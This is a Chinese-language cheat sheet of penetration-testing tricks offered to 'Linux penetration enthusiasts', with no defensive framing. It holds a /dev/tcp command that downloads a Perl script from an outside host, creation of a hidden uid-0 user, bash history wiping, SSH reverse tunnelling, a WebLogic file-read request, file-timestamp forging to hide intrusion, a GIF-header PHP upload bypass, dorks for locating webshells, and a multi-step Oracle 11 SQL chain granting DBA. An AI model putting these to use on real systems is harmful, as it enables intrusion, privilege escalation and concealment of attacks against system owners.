# note {#note}

shell code

MSF metasploit framework

blackhat

送给linux渗透爱好者的小技巧:

1.无wget nc等下载工具时下载文件

exec 5&lt;&gt;/dev/tcp/yese.yi.org/80 &amp;&amp;echo -e &quot;GET /c.pl HTTP/1.0\n&quot; &gt;&amp;5 &amp;&amp; cat&lt;&amp;5 &gt; c.pl

2.Linux添加uid为0的用户

useradd -o -u 0 cnbird

3.bash去掉history记录

export HISTSIZE=0

export HISTFILE=/dev/null

4.SSH反向链接

ssh -C -f -N -g -R 44:127.0.0.1:22 cnbird@ip -p 指定远端服务器SSH端口

然后服务器上执行ssh localhost  -p 44即可

5.weblogic本地读取文件漏洞

curl -H &quot;wl_request_type: wl_xml_entity_request&quot; -H &quot;xml-registryname: ../../&quot; -H &quot;xml-entity-path: config.xml&quot; [http://server/wl_management_internal2/wl_management](http://server/wl_management_internal2/wl_management)

6.apache查看虚拟web目录

./httpd -t -D DUMP_VHOSTS

7.cvs渗透技巧

CVSROOT/passwd   UNIX SHA1的密码文件

CVSROOT/readers

CVSROOT/writers

CVS/Root  

CVS/Entries     更新的文件和目录内容

CVS/Repository

8.Cpanel路径泄露

/3rdparty/squirrelmail/functions/plugin.php

9.修改上传文件时间戳(掩盖入侵痕迹)

touch -r 老文件时间戳 新文件时间戳

10.利用baidu和google搜索目标主机webshell

intitle:PHPJackal 1t1t

11.包总补充

创建临时&quot;隐藏&quot;目录 mkdir /tmp/...

/tmp/...目录在管理员有宿醉的情况下是&quot;隐藏&quot;的，可以临时放点exp啥的

12.利用linux输出绕过gif限制的图片

printf &quot;GIF89a\x01\x00\x01\x00&lt;?php phpinfo();?&gt;&quot; &gt; poc.php

13.读取环境变量对于查找信息非常有帮助

/proc/self/environ

14.最新的ORACLE 11提升用户权限(只要session权限)

DBMS_JVM_EXP_PERMS 中的IMPORT_JVM_PERMS

判断登陆权限

select * from session_privs;

Create SESSION

select * from session_roles;

select TYPE_NAME, NAME, ACTION FROM SYS.DBA_JAVA_POLICY Where GRANTEE = &amp;apos;GREMLIN(用户名)&amp;apos;;

DESC JAVA$POLICY$

DECLARE

POL DBMS_JVM_EXP.TEMP_JAVA_POLICY;

CURSOR C1 IS Select &amp;apos;GRANT&amp;apos; USER(), &amp;apos;SYS&amp;apos;, &amp;apos;java.io.FilePermission&amp;apos;, &amp;apos;&lt;&lt;ALL FILES&gt;&gt;&amp;apos;, &amp;apos;execute&amp;apos;, &amp;apos;ENABLE&amp;apos; FROM DUAL;

BEGIN

OPEN C1;

FETCH C1 BULK COLLECT INTO POL;

CLOSE C1;

DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);

END;

/

connect / as sysdba

COL TYPE_NAME FOR A30;

COL NAME FOR A30;

COL_ACTION FOR A10;

Select TYPE_NAME, NAME, ACTION FROM SYS.DBA_JAVA_POLICY Where GRANTEE = &amp;apos;用户&amp;apos;;

connect 普通用户

set serveroutput on

exec dbms_java.set_output(10000);

Select DBMS_JAVA.SET_OUTPUT_TO_JAVA(&amp;apos;ID&amp;apos;, &amp;apos;oracle/aurora/rdbms/DbmsJava&amp;apos;, &amp;apos;SYS&amp;apos;, &amp;apos;writeOutputToFile&amp;apos;, &amp;apos;TEXT&amp;apos;, NULL, NULL, NULL, NULL,0,1,1,1,1,0, &amp;apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;&amp;apos;BEGIN EXECUTE IMMEDIATE &amp;apos;&amp;apos;GRANT DBA TO 用户&amp;apos;&amp;apos;; END;&amp;apos;, &amp;apos;BEGIN NULL; END;&amp;apos;) FROM DUAL;

EXEC DBMS_CDC_ISUBSCRIBE.INT_PURGE_WINDOWS(&amp;apos;NO_SUCH_SUBSCRIPTION&amp;apos;, SYSDATE());

set role dba;

select * from session_privs;

EXEC SYS.VULNPROC(&amp;apos;FOO&quot;||DBMS_JAVA.SET_OUTPUT_TO_SQL(&quot;ID&quot;,&quot;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE&quot;&quot;GRANT DBA TO PUBLIC&quot;&quot;;DBMS_OUTPUT.PUT_LINE(:1);END;&quot;,&quot;TEXT&quot;)||&quot;BAR&amp;apos;);

Select DBMS_JAVA.RUNJAVA(&amp;apos;oracle/aurora/util/Test&amp;apos;) FROM DUAL;

SET ROLE DBA;

15\. webLogic渗透技巧

四. Weblogin Script Tool(WLST)

写入到&lt;Domain_home&gt;\\config\\config.xml

1.进行修改:

&lt;bea_home&gt;\wlserver_10.0\server\bin\setWLSenv.sh

2.启动WLST

java weblogic.WLST

wls:/offline&gt; connect(&amp;apos;admin&amp;apos;, &amp;apos;admin&amp;apos;, &amp;apos;t3://127.0.0.1:7001&amp;apos;)

wls:/bbk/serverConfig&gt; help()

wls:/bbk/serverConfig&gt; edit()

wls:/bbk/serverConfig&gt; cd(&amp;apos;Servers&amp;apos;)

wls:/bbk/serverConfig/Server-cnbird&gt; cd(&amp;apos;Log&amp;apos;)

wls:/bbk/serverConfig/Server-cnbird/log&gt; cd(&amp;apos;Server-cnbird&amp;apos;)

wls:/bbk/serverConfig/Server-cnbird/log/Server-cnbird&gt; startEdit()

wls:/bbk/serverConfig/Server-cnbird/log/Server-cnbird !&gt; set(&amp;apos;FileCount&amp;apos;, &amp;apos;4&amp;apos;)

wls:/bbk/serverConfig/Server-cnbird/log/Server-cnbird !&gt; save()

wls:/bbk/serverConfig/Server-cnbird/log/Server-cnbird !&gt; activate() 提交对应Active Change

wls:/bbk/serverConfig/Server-cnbird/log/Server-cnbird !&gt; disconnect()

wls:/offline&gt; exit()

3.批处理:

保存以上命令为cnbird.py

connect(&amp;apos;admin&amp;apos;, &amp;apos;admin&amp;apos;, &amp;apos;t3://127.0.0.1:7001&amp;apos;)

cd(&amp;apos;Servers&amp;apos;)

cd(&amp;apos;Log&amp;apos;)

cd(&amp;apos;Server-cnbird&amp;apos;)

startEdit()

set(&amp;apos;FileCount&amp;apos;, &amp;apos;4&amp;apos;)

save()

然后执行java weblogic.WLST cnbird.py